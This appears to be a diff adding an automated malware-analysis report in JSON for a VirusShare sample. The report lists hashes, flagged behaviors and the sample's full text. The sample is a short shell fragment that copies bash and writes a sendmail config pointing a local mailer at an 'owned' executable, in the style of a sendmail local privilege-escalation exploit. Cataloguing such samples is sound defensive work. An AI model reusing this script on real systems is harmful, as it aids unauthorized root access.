@@ -1,0 +1,48 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "SHELL": "May run an executable file or a system command",
+            "mkdir": "May create a directory"
+        },
+        "macro": "\nTMPDIR=/tmp/sx1\nSHELL=/bin/bash\nEXECUTABLE=$TMPDIR/owned\n\ncp -f /bin/bash $TMPDIR/sushi\n\numask 022\nmkdir -p $TMPDIR\nchmod 777 $TMPDIR\n\ncat <<_MUX_ >/tmp/x\nO QueueDirectory=$TMPDIR\nO ForwardPath=/no_forward_file\nS0\nR\\$*\t\\$#local \\$: \\$1\nMlocal, P=$EXECUTABLE, F=lsDFMAw5:/|@qSPfhn9, S=EnvFromL/HdrFromL, R=EnvToL/HdrToL,\n        T=DNS/RFC822/X-Unix, A=$EXECUTABLE\n_MUX_"
+    },
+    "filename": "VirusShare_45e0e56a786be281fbd04eb49a372cbb",
+    "filesize": 370,
+    "filetype": "ASCII text",
+    "hashes": {
+        "md5": "45e0e56a786be281fbd04eb49a372cbb",
+        "sha1": "077744759da88f9813f51c5c7d0c2d86e7f4edeb",
+        "sha256": "101c5da112dc7c3cab888690b9f63c364952f90e0776b99cb5555627ffcc3049"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "TMPDIR=/tmp/sx1",
+            "SHELL=/bin/bash",
+            "EXECUTABLE=$TMPDIR/owned",
+            "cp -f /bin/bash $TMPDIR/sushi",
+            "umask 022",
+            "mkdir -p $TMPDIR",
+            "chmod 777 $TMPDIR",
+            "cat <<_MUX_ >/tmp/x",
+            "O QueueDirectory=$TMPDIR",
+            "O ForwardPath=/no_forward_file",
+            "R\\$*\t\\$#local \\$: \\$1",
+            "Mlocal, P=$EXECUTABLE, F=lsDFMAw5:/|@qSPfhn9, S=EnvFromL/HdrFromL, R=EnvToL/HdrToL,",
+            "        T=DNS/RFC822/X-Unix, A=$EXECUTABLE",
+            "_MUX_"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.265861",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
